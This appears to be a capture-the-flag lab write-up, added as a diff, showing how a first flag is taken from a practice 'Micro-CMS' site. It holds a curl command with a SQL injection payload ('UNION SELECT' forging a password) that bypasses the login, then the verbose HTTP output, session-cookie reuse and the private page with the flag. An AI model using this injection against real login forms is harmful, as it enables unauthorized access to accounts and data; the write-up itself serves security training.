@@ -1,0 +1,105 @@
+Flag1:
+Save the cookie to out.txt.
+
+curl -c out.txt -v -d "username=foo' UNION SELECT \"AAA\" as password FROM admins WHERE '1' = '1" -d "password=AAA" http://35.190.155.168/2089df521e/login
+*   Trying 35.190.155.168...
+* Connected to 35.190.155.168 (35.190.155.168) port 80 (#0)
+> POST /2089df521e/login HTTP/1.1
+> Host: 35.190.155.168
+> User-Agent: curl/7.47.0
+> Accept: */*
+> Content-Length: 84
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 84 out of 84 bytes
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.0 (Ubuntu)
+< Date: Wed, 06 Nov 2019 22:24:31 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 340
+< Connection: keep-alive
+< Vary: Cookie
+* Added cookie l2session="eyJhZG1pbiI6dHJ1ZX0.XcNIHw.5QtHUpqfENfOE5pjmr4abObebCo" for domain 35.190.155.168, path /, expire 0
+< Set-Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.XcNIHw.5QtHUpqfENfOE5pjmr4abObebCo; HttpOnly; Path=/
+<
+
+<!doctype html>
+<html>
+        <head>
+                <title>Logged in</title>
+        </head>
+        <body>
+                <h1>Logged In!</h1>
+                <a href="home">Go Home</a>
+                <script>setTimeout(function() { window.location = 'home'; }, 3000);</script>
+                <!-- You got logged in, congrats!  Do you have the real username and password?  If not, might want to do that! -->
+        </body>
+</html>
+* Connection #0 to host 35.190.155.168 left intact
+
+Use same cookie:
+curl -b out.txt http://35.190.155.168/2089df521e/home -v
+*   Trying 35.190.155.168...
+* Connected to 35.190.155.168 (35.190.155.168) port 80 (#0)
+> GET /2089df521e/home HTTP/1.1
+> Host: 35.190.155.168
+> User-Agent: curl/7.47.0
+> Accept: */*
+> Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.XcNIHw.5QtHUpqfENfOE5pjmr4abObebCo
+>
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.0 (Ubuntu)
+< Date: Wed, 06 Nov 2019 22:25:08 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 322
+< Connection: keep-alive
+<
+
+<!doctype html>
+<html>
+        <head>
+                <title>Micro-CMS</title>
+        </head>
+        <body>
+                <a href="logout">Log out</a>
+                <ul>
+<li><a href="page/1">Micro-CMS Changelog</a></li>
+<li><a href="page/2">Markdown Test</a></li>
+<li><a href="page/3">Private Page</a></li>
+                </ul>
+                <a href="page/create">Create a new page</a>
+        </body>
+</html>
+* Connection #0 to host 35.190.155.168 left intact
+
+Then go to page/3 which contains the flag
+curl -b out.txt http://35.190.155.168/2089df521e/page/3 -v
+*   Trying 35.190.155.168...
+* Connected to 35.190.155.168 (35.190.155.168) port 80 (#0)
+> GET /2089df521e/page/3 HTTP/1.1
+> Host: 35.190.155.168
+> User-Agent: curl/7.47.0
+> Accept: */*
+> Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.XcNIHw.5QtHUpqfENfOE5pjmr4abObebCo
+>
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.0 (Ubuntu)
+< Date: Wed, 06 Nov 2019 22:25:21 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 294
+< Connection: keep-alive
+<
+
+<!doctype html>
+<html>
+        <head>
+                <title>Private Page</title>
+        </head>
+        <body>
+                <a href="../">&lt;-- Go Home</a><br>
+                <a href="edit/3">Edit this page</a>
+                <h1>Private Page</h1>
+<p>My secret is ^FLAG^fxx$FLAG$</p>
+        </body>
+</html>
+* Connection #0 to host 35.190.155.168 left intact
